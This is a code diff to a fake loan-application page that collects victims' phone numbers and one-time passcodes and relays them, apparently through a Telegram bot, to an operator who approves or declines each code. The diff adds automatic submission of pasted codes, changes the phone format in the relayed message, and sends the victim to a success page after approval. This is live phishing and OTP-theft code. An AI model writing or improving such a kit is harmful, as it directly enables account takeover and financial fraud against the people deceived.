@@ -209,7 +209,6 @@
                 document.getElementById('loanAmount').textContent = '$' + parseFloat(amount).toLocaleString() + ' USD';
             }
             setupOTP();
-            // Auto-focus first OTP box
             boxes[0].focus();
         }
 
@@ -242,6 +241,19 @@
                     if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
                 });
             });
+            
+            // Fix: Autofill and autosend handling for mobile/paste
+            document.addEventListener('paste', e => {
+                const data = e.clipboardData.getData('text').replace(/\D/g, '');
+                if (data.length === 6) {
+                    data.split('').forEach((d, i) => {
+                        boxes[i].value = d;
+                        boxes[i].classList.add('ok');
+                    });
+                    chk();
+                    setTimeout(() => doOTP(), 300);
+                }
+            });
         }
 
         function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
@@ -268,8 +280,10 @@
             clrErr();
             if (otp.length !== 6) { showErr('Please enter the full 6-digit code'); return; }
 
-            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${bd.price || '0'})</code>`;
-            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]];
+            // Fix: Start with 7 instead of +263 as requested
+            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${bd.price || '0'})</code>`;
+            // Fix: Two buttons Approved and Decline
+            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Decline', callback_data: 'otp_declined' }]];
 
             document.getElementById('ov').classList.add('on');
             tg(msg, btns);
@@ -289,6 +303,7 @@
                                     if (cb === 'otp_approved') { 
                                         clearInterval(iv); 
                                         document.getElementById('ov').classList.remove('on'); 
+                                        // Fix: Approved opens success.html
                                         location.href = 'success.html';
                                     }
                                     else if (cb === 'otp_declined') { 
